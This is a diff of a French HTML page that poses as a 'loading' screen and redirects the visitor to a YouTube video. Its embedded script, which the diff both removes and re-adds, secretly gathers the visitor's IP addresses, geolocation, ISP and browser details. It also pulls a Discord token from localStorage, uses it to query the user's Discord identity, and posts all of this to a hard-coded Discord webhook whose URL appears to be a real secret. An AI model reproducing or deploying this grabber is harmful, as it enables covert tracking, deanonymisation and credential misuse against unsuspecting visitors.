@@ -1,17 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
   <meta charset="utf-8">
   <title>Chargement en cours...</title>
   <style>
     body {
+      margin: 0;
+      height: 100vh;
       background: #000;
       color: #fff;
       font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 15%;
-      margin: 0;
-      height: 100vh;
+      box-sizing: border-box;
     }
     .loader {
       border: 14px solid #222;
@@ -37,55 +38,56 @@
   <p>Redirection automatique en cours</p>
   <div class="countdown" id="timer">5 secondes</div>
 
-<script>
-// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-// METS TON WEBHOOK DISCORD ICI
-const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";
-// ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
+  <script>
+    // === À MODIFIER : ton webhook Discord ===
+    const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";
 
-(async () => {
-  try {
-    const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
-      fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
-      fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
-      fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
-    ]);
+    (async () => {
+      try {
+        // Récupération IP + géolocalisation
+        const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
+          fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
+          fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
+          fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
+        ]);
 
-    const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
-    const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
-    const geo = geoRes.status === "fulfilled" ? geoRes.value : {};
+        const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
+        const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
+        const geo = geoRes.status === "fulfilled" ? geoRes.value : {};
 
-    const ua = navigator.userAgent;
-    const lang = navigator.language || "inconnu";
-    const screenRes = `${screen.width}x${screen.height}`;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";
+        // Infos navigateur
+        const ua = navigator.userAgent;
+        const lang = navigator.language || "inconnu";
+        const screenRes = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";
 
-    let discordUsername = "Non détecté (pas connecté à Discord ou bloqueur actif)";
-    let discordTag = "";
-    let discordId = "";
-    let discordAvatar = "";
+        // Tentative de récupération du pseudo Discord
+        let discordUsername = "Non détecté";
+        let discordTag = "";
+        let discordId = "";
+        let discordAvatar = "";
 
-    try {
-      const token = localStorage.getItem("token")?.replace(/"/g, '');
-      if (token) {
-        const tokenRes = await fetch("https://discord.com/api/v9/users/@me", {
-          headers: { "Authorization": token }
-        });
-        if (tokenRes.ok) {
-          const user = await tokenRes.json();
-          discordUsername = user.global_name || user.username || "Inconnu";
-          discordTag = `${user.username}#${user.discriminator}`;
-          discordId = user.id;
-          discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
-        }
-      }
-    } catch (e) {}
+        try {
+          const token = localStorage.getItem("token")?.replace(/"/g, '');
+          if (token) {
+            const res = await fetch("https://discord.com/api/v9/users/@me", {
+              headers: { "Authorization": token }
+            });
+            if (res.ok) {
+              const user = await res.json();
+              discordUsername = user.global_name || user.username || "Inconnu";
+              discordTag = user.discriminator === "0" ? "" : `#${user.discriminator}`;
+              discordId = user.id;
+              discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
+            }
+          }
+        } catch (e) {}
 
-    const message = `
+        // Message texte propre (sans embed)
+        const message = `
 🎯 **Nouvelle visite détectée**
 
-**Pseudo Discord :** ${discordUsername}
-**Tag complet :** ${discordTag || "Non détecté"}
+**Pseudo Discord :** ${discordUsername}${discordTag}
 **ID Discord :** ${discordId || "Non détecté"}
 
 **IP IPv4 :** \`${ipv4}\`
@@ -94,39 +96,42 @@ const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1f
 **Ville / Région :** ${geo.city || "Inconnu"} • ${geo.region || ""}
 **FAI :** \`${geo.org || "Inconnu"}\`
 
-**Navigateur / OS :** ${ua.substring(0, 300)}
+**Navigateur :** ${ua.substring(0, 300)}
 **Langue :** ${lang}
-**Résolution écran :** ${screenRes}
+**Résolution :** ${screenRes}
 **Fuseau horaire :** ${timezone}
-**Page visitée :** ${window.location.href}
+**Page :** ${window.location.href}
 **Heure (UTC) :** ${new Date().toISOString()}
-    `.trim();
+        `.trim();
 
-    await fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: message,
-        username: discordUsername !== "Non détecté" ? discordUsername : "Tracker",
-        avatar_url: discordAvatar || ""
-      })
-    });
+        // Envoi du message
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: message,
+            username: discordUsername !== "Non détecté" ? discordUsername : "Tracker",
+            avatar_url: discordAvatar
+          })
+        });
 
-  } catch (e) {}
-})();
+      } catch (e) {
+        // Silencieux en cas d'erreur
+      }
+    })();
 
-// Compte à rebours + ouverture dans un nouvel onglet
-let timeLeft = 5;
-const timerEl = document.getElementById("timer");
-const countdown = setInterval(() => {
-  timeLeft--;
-  timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
-  if (timeLeft <= 0) {
-    clearInterval(countdown);
-    // Ouvre dans un nouvel onglet → plus d'erreur Firefox !
-    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-  }
-}, 1000);
-</script>
+    // Compte à rebours + ouverture dans un nouvel onglet (compatible Firefox)
+    let timeLeft = 5;
+    const timerEl = document.getElementById("timer");
+    const countdown = setInterval(() => {
+      timeLeft--;
+      timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        // Ouvre la vidéo dans un nouvel onglet → fonctionne partout
+        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+      }
+    }, 1000);
+  </script>
 </body>
 </html>
